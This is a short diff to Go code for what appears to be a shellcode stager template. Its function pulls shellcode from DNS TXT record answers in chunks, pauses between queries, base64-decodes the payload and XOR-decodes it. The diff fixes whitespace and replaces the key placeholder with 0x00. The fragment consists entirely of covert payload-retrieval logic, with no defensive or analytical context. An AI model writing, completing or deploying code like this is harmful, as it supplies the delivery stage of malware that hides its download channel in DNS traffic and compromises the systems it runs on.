@@ -74,7 +74,7 @@ func retreiveShellcodeAsBytes() []byte {
 		if len(dnsResponse.Answer) < 1 {
 			break
 		}
-		
+
 		txtRecord := strings.Split(dnsResponse.Answer[0].String(), "\t")[4]
 		txtRecords = txtRecords + strings.Replace(txtRecord, "\"", "", -1)
 		time.Sleep({SLEEP} * 1000 * time.Millisecond)
@@ -86,7 +86,7 @@ func retreiveShellcodeAsBytes() []byte {
 	//Decode the shellcode by XORing it with the predefined key (If the shellcode is not encoded, use 0x00)
 	decodedBytes := make([]byte, len(decodedBase64))
 	for i := 0; i < len(decodedBase64); i++ {
-		decodedBytes[i] = decodedBase64[i] ^ {KEY}
+		decodedBytes[i] = decodedBase64[i] ^ 0x00
 	}
 
 	return decodedBytes
